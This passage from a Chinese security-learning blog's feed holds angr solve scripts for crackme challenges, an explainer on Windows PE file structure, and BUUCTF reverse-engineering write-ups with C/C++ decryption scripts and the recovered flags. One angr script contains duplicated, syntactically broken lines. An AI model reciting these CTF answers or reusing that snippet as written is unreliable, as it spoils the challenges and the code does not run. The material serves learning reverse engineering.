angr.Project(&#x27;./12_angr_veritesting&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state, veritesting = True)     #就是这半行</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_veritesting1.png"></p><h2 id="angr-static-binary"><a href="#angr-static-binary" class="headerlink" title="angr_static_binary"></a>angr_static_binary</h2><p>这一题的程序采用静态编译。angr在模拟动态编译的程序时会将系统函数替换成自己的一套更快的代码。然而对于静态编译的程序则需要我们自己手动hook。好在angr提供了他自己的那一套代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(&#x27;./13_angr_static_binary&#x27;)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">s = p.factory.simgr(init_state, veritesting = True)</span><br><span class="line"></span><br><span class="line">p.hook_symbol(&#x27;__libc_start_main&#x27;, angr.SIM_PROCEDURES[&#x27;glibc&#x27;][&#x27;__libc_start_main&#x27;]())     #静态编译的程序会先执行这个函数</span><br><span class="line">p.hook_symbol(&#x27;printf&#x27;, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;printf&#x27;]())</span><br><span class="line">p.hook_symbol(&#x27;__isoc99_scanf&#x27;, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;scanf&#x27;]())</span><br><span class="line">p.hook_symbol(&#x27;puts&#x27;, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;puts&#x27;]())</span><br><span class="line">p.hook_symbol(&#x27;_strcmp&#x27;, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strcmp&#x27;]())</span><br><span class="line"></span><br><span class="line">def aim_out(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def avoid_out(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">s.explore(find = aim_out, avoid = avoid_out)</span><br><span class="line"></span><br><span class="line">if s.found:</span><br><span class="line">    print(s.found[0].posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;).posix.dumps(0))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;fail&quot;)</span><br></pre></td></tr></table></figure><p>运行得出结果(WARNING太多了，截不全)<br><img src="/img/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/angr_static_binary1.png"></p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>再次引用名言：</p><blockquote><p>我超，这angr好几把神奇。        ——iPlayForSG</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Angr符号执行&quot;&gt;&lt;a href=&quot;#Angr符号执行&quot; class=&quot;headerlink&quot; title=&quot;Angr符号执行&quot;&gt;&lt;/a&gt;Angr符号执行&lt;/h1&gt;&lt;p&gt;首先引用名言：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我超，这angr好几把神奇。    </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PE文件结构</title>
    <link href="https://clovershrub.github.io/2023/01/12/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <id>https://clovershrub.github.io/2023/01/12/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</id>
    <published>2023-01-11T16:00:00.000Z</published>
    <updated>2023-09-19T01:35:36.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p>EP说：“快去学PE！”，遂有了这篇博客。</p><h2 id="啥是PE？"><a href="#啥是PE？" class="headerlink" title="啥是PE？"></a>啥是PE？</h2><p>如果说EP是EPsilon的话，PE就一定是nolisPE了罢……<br>好吧，PE全称Windows PE文件，他是Windows下可执行程序的一个统称。常见的有可执行程序(.exe)，驱动(.sys)，动态链接库(.dll)等。最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下。PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式(请注意不是PE64)。<br>先来几张图助助兴：<br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E5%95%A5%E6%98%AFPE%EF%BC%9F1.png"><br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E5%95%A5%E6%98%AFPE%EF%BC%9F2.png"><br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E5%95%A5%E6%98%AFPE%EF%BC%9F3.png"></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="PE文件结构-1"><a href="#PE文件结构-1" class="headerlink" title="PE文件结构"></a>PE文件结构</h3><p>一般分为以下四个部分：</p><ol><li><strong>DOS头</strong>：是用来兼容 MS-DOS 操作系统的，目的是当这个文件在 MS-DOS 上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode. 还有一个目的，就是指明 NT 头在文件中的位置。</li><li><strong>NT头</strong>：包含 windows PE 文件的主要信息，其中包括一个 ‘PE’ 字样的签名，PE文件头(IMAGE_FILE_HEADER)和 PE可选头(IMAGE_OPTIONAL_HEADER32)。</li><li><strong>节表</strong>：是PE文件后续节的描述，windows根据节表的描述加载每个节。</li><li><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读&#x2F;执行权限，节的名字和数量可以自己定义。</li></ol><h3 id="VA-虚拟地址-与RVA-相对虚拟地址"><a href="#VA-虚拟地址-与RVA-相对虚拟地址" class="headerlink" title="VA(虚拟地址)与RVA(相对虚拟地址)"></a>VA(虚拟地址)与RVA(相对虚拟地址)</h3><p>当一个PE文件被加载到内存中以后，我们称之为”映象 “(image)，一般来说，PE文件在硬盘上和在内存里是不完全一样的，被加载到内存以后其占用的虚拟地址空间要比在硬盘上占用的空间大一些，这是因为各个节在硬盘上是连续的，而在内存中是<strong>按页对齐</strong>的，所以加载到内存以后节之间会出现一些“空洞”。<br>因为存在这种对齐，所以在PE结构内部，表示某个位置的地址采用了两种方式：</p><ul><li>针对在硬盘上存储文件中的地址，称为原始存储地址或物理地址，表示<strong>距离文件头的偏移</strong>。</li><li>针对加载到内存以后映象中的地址，称为 相对虚拟地址(RVA)，表示<strong>相对内存映象头的偏移</strong>。</li></ul><p>然而CPU 的某些指令是需要使用<strong>绝对地址</strong>的，比如取全局变量的地址，传递函数的地址，以及编译后的汇编指令中肯定需要用到绝对地址而不是相对映象头的偏移，因此PE文件会建议操作系统将其加载到某个内存地址(这个叫<strong>基地址</strong>。段地址其实就是一种基地址，但基地址并不等于就是段地址)。编译器便根据这个地址求出代码中一些 全局变量和函数的地址，并将这些地址用到对应的指令中。<br>因此可以得出<code>VA = RVA + IMAGEBASE</code>。</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><h3 id="DOS头-1"><a href="#DOS头-1" class="headerlink" title="DOS头"></a>DOS头</h3><p><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/DOS%E5%A4%B41.png"><br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/DOS%E5%A4%B42.png"><br>DOS头目前有用的东西只有e_magic和e_lfanew(这个怎么读？e_了发new？)两个。</p><ul><li>e_magic用来标志这是一个PE文件</li><li>e_lfanew用来标志NT头的偏移。</li></ul><p>在010 Editor中可以看见e_lfanew的值是0x00000120(大部分情况为小端存储)，而在00120h的地方恰好为NT头的起始位置。</p><h3 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h3><p>DOS存根则是一段简单的DOS程序，主要用来输出类似“This program cannot be run in DOS mode.”的提示语句。即使没有DOS存根，程序也能正常执行。在程序运行了但没完全运行的时候(比如在64位的机器上运行16位的程序)输出字符串。</p><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><p><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/NT%E5%A4%B41.png"><br>可以看出NT头分为三个部分，标识符、文件头、可选头。</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>固定死的<code>PE..</code></p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E6%96%87%E4%BB%B6%E5%A4%B41.png"></p><h3 id="可选头"><a href="#可选头" class="headerlink" title="可选头"></a>可选头</h3><p>别被名字骗了，它不可选，包含了一大坨东西。<br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E5%8F%AF%E9%80%89%E5%A4%B41.png"></p><h2 id="数据目录表"><a href="#数据目录表" class="headerlink" title="数据目录表"></a>数据目录表</h2><p>同样包含一大坨，导入导出表较为重要。<br><img src="/img/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E8%A1%A81.png"></p><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>导出表是用来描述模块(.dll)中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress()函数就能动态获取到函数的地址。<br>函数导出的方式有两种：</p><ul><li>一种是按名字导出，</li><li>一种是按序号导出。</li></ul><p>这两种导出方式在导出表中的描述方式也不相同。</p><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入表在PE文件加载时，会根据这个表里的内容加载依赖的模块(.dll)，并填充所需函数的地址。</p><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>为了解决像call这样的使用VA的代码，在模块基址发生变化时还能准确定位而产生的表。步骤如下：</p><ol><li>编译的时候由编译器识别出哪些项使用了模块内的直接VA，比如push、一个全局变量、函数地址，这些指令的操作数在模块加载的时候就需要被重定位。</li><li>链接器生成PE文件的时候将编译器识别的重定位的项纪录在一张表里，这张表就是重定位表，保存在 DataDirectory中，序号是IMAGE_DIRECTORY_ENTRY_BASERELOC。</li><li>PE文件加载时，PE加载器分析重定位表，将其中每一项按照现在的模块基址进行重定位。</li></ol><h2 id="其他人的博客"><a href="#其他人的博客" class="headerlink" title="其他人的博客"></a>其他人的博客</h2><p><a href="https://eps1l0h.github.io/2022/08/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">EPsilon</a>和<a href="https://www.cnblogs.com/Here-is-SG/p/15784584.html#autoid-6-3-0">iPlayForSG</a>两位学长的博客是跟着同一个视频学的。其中有一些非常骚的操作，像是自行添加一个节和代码，然后让程序先执行自己添加的内容。在读其他人的博客的时候听说有些壳和病毒就会单独加一个节什么的。按理说搞完理论知识确实应该实践一波的，但是我懒，不想实践，摆烂了……</p><p>博客抄完了，溜了~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PE文件结构&quot;&gt;&lt;a href=&quot;#PE文件结构&quot; class=&quot;headerlink&quot; title=&quot;PE文件结构&quot;&gt;&lt;/a&gt;PE文件结构&lt;/h1&gt;&lt;p&gt;EP说：“快去学PE！”，遂有了这篇博客。&lt;/p&gt;
&lt;h2 id=&quot;啥是PE？&quot;&gt;&lt;a href=&quot;#啥是P</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF逆向工程-2</title>
    <link href="https://clovershrub.github.io/2022/11/22/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/"/>
    <id>https://clovershrub.github.io/2022/11/22/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/</id>
    <published>2022-11-21T16:00:00.000Z</published>
    <updated>2023-09-19T02:09:14.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF逆向工程-2"><a href="#BUUCTF逆向工程-2" class="headerlink" title="BUUCTF逆向工程-2"></a>BUUCTF逆向工程-2</h1><h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><p>打开后可以找到发送邮件的函数原型：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C1.png"><br>根据交叉引用找到调用它的地方：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C2.png"><br>可以知道C2.MAILSERVER应当为邮箱，根据交叉引用可以找到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C3.png"><br>这个函数加载了一个core文件，然后调用里面的NativeMethod.m()函数，查看它的Library：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C4.png"><br>有一个libcore.so文件，将它用IDA打开，在java_com_net_cn_NativeMethod_m()函数中可以看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C5.png"><br>查看base64方法中的shared可以拿到加密表：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%E7%9B%B8%E5%86%8C6.png"><br>解密得到flag：<a href="mailto:&#49;&#x38;&#x32;&#x31;&#56;&#x34;&#54;&#53;&#x31;&#50;&#x35;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;">&#49;&#x38;&#x32;&#x31;&#56;&#x34;&#54;&#53;&#x31;&#50;&#x35;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;</a></p><h2 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h2><p>代码写得根本看不懂在干什么，但是瞎点一通发现unk_4D3C58里就是flag：hello_world_gogogo<br>从结果来看应该是一个go语言，无语。。。</p><h2 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h2><p>打开看见它想让我破译一个base64：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BWUSTCTF2020%5Dlevel31.png"><br>点进加密函数可以跟踪到密码表：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BWUSTCTF2020%5Dlevel32.png"><br>用这个密码表解码发现解出来是乱码……想到密码表可能被修改过，查看它的交叉引用：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BWUSTCTF2020%5Dlevel33.png"><br>写个简单的脚本得到flag：Base64_is_the_start_of_reverse</p><h2 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h2><p>打开看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGWCTF2019%5Dxxor1.png"><br>前面一段对输入进行TEA，之后判断结果，解码脚本在此：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">int</span> *v, <span class="type">int</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], i;</span><br><span class="line"><span class="type">int</span> delta = <span class="number">1166789954</span>;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">v1 -= (v0 + sum + <span class="number">20</span>) ^ ((v0 &lt;&lt; <span class="number">6</span>) + k[<span class="number">2</span>]) ^ ((v0 &gt;&gt; <span class="number">9</span>) + k[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">v0 -= (v1 + sum + <span class="number">11</span>) ^ ((v1 &lt;&lt; <span class="number">6</span>) + k[<span class="number">0</span>]) ^ ((v1 &gt;&gt; <span class="number">9</span>) + k[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125; </span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v[<span class="number">2</span>] = &#123;&#125;, k[<span class="number">4</span>] = &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a1[<span class="number">6</span>] = &#123;<span class="number">-548868226</span>, <span class="number">550153460</span>, <span class="number">3774025685</span>, <span class="number">1548802262</span>, <span class="number">2652626477</span>, <span class="number">-2064448480</span>&#125;;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">        v[<span class="number">0</span>] = a1[i*<span class="number">2</span>];</span><br><span class="line">        v[<span class="number">1</span>] = a1[i*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">        a1[i*<span class="number">2</span>] = v[<span class="number">0</span>];</span><br><span class="line">        a1[i*<span class="number">2</span>+<span class="number">1</span>] = v[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, *((<span class="type">char</span> *)&amp;amp;a1[i] + j));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：re_is_great!<br>说实话，写完这题我仍然不是很理解HIDWORD、LODWORD和ELF的逆序存储，全靠IDA动调测算出数据的存储方式，然后进行逆推，再根据输出调整顺序。。。<br>虽说篇幅不长，但是这个b干了我将近4个小时</p><h2 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h2><p>打开IDA，果然，C++写出来的程序最恶心了（虽然我喜欢用C++）：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn4%5DIgniteMe1.png"><br>sub_4010F0是输入函数，sub_401050是加密函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn4%5DIgniteMe2.png"><br>其中sub401000函数里面是一个__ROL4__函数，百度了半天我也没看明白，但是IDA动调之后可以看见最后v4&#x3D;4，所以也可以写出脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>, </span><br><span class="line">   <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>&#125;;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> v4 = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">38</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i] = v4 ^ ans[i];</span><br><span class="line">    v4 = flag[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">38</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出flag：<a href="mailto:&#x52;&#95;&#121;&#x30;&#x75;&#95;&#x48;&#x30;&#x74;&#95;&#51;&#110;&#48;&#117;&#103;&#72;&#x5f;&#116;&#x30;&#x5f;&#49;&#x67;&#110;&#x31;&#x74;&#x33;&#64;&#102;&#x6c;&#97;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#x63;&#x6f;&#109;">&#x52;&#95;&#121;&#x30;&#x75;&#95;&#x48;&#x30;&#x74;&#95;&#51;&#110;&#48;&#117;&#103;&#72;&#x5f;&#116;&#x30;&#x5f;&#49;&#x67;&#110;&#x31;&#x74;&#x33;&#64;&#102;&#x6c;&#97;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#x63;&#x6f;&#109;</a></p><h2 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h2><p>没啥技术含量<br>flag：cpp_@nd_r3verse_@re_fun</p><h2 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h2><p>IDA中代码很短，理论上运行一遍就有答案：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn6%5DOverlong1.png"><br>其中unk_402008是给定的175空间的数组，但是sub_401160中对于次数组的调用最多只有28*4&#x3D;112空间，因此推测所传参数28太小，所以拖入x32dbg修改对应二进制值1C为AE：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn6%5DOverlong2.png"><br>之后运行起来，即可得到结果：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BFlareOn6%5DOverlong3.png"><br>得到flag：<a href="mailto:&#x49;&#x5f;&#97;&#x5f;&#x4d;&#95;&#x74;&#x5f;&#x68;&#x5f;&#101;&#95;&#x65;&#x5f;&#110;&#95;&#67;&#x5f;&#111;&#95;&#68;&#x5f;&#105;&#x5f;&#x6e;&#x5f;&#103;&#x40;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#x6f;&#110;&#46;&#99;&#111;&#x6d;">&#x49;&#x5f;&#97;&#x5f;&#x4d;&#95;&#x74;&#x5f;&#x68;&#x5f;&#101;&#95;&#x65;&#x5f;&#110;&#95;&#67;&#x5f;&#111;&#95;&#68;&#x5f;&#105;&#x5f;&#x6e;&#x5f;&#103;&#x40;&#x66;&#x6c;&#97;&#114;&#x65;&#x2d;&#x6f;&#110;&#46;&#99;&#111;&#x6d;</a></p><h2 id="UTCTF2020-basic-re"><a href="#UTCTF2020-basic-re" class="headerlink" title="[UTCTF2020]basic-re"></a>[UTCTF2020]basic-re</h2><p>shift+F12:<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BUTCTF2020%5Dbasic-re1.png"><br>得到flag：str1ngs_1s_y0ur_fr13nd</p><h2 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h2><p>简单的变表base64，得到flag：<a href="mailto:&#x73;&#x68;&#x30;&#48;&#116;&#105;&#110;&#x67;&#95;&#x70;&#104;&#x69;&#x73;&#x68;&#x5f;&#105;&#x6e;&#x5f;&#x61;&#x5f;&#x62;&#x61;&#114;&#114;&#101;&#108;&#64;&#x66;&#x6c;&#x61;&#114;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#111;&#x6d;">&#x73;&#x68;&#x30;&#48;&#116;&#105;&#110;&#x67;&#95;&#x70;&#104;&#x69;&#x73;&#x68;&#x5f;&#105;&#x6e;&#x5f;&#x61;&#x5f;&#x62;&#x61;&#114;&#114;&#101;&#108;&#64;&#x66;&#x6c;&#x61;&#114;&#x65;&#x2d;&#111;&#x6e;&#46;&#99;&#111;&#x6d;</a></p><h2 id="ACTF新生赛2020-Oruga"><a href="#ACTF新生赛2020-Oruga" class="headerlink" title="[ACTF新生赛2020]Oruga"></a>[ACTF新生赛2020]Oruga</h2><p>这是一道比较抽象的迷宫题：<br><img 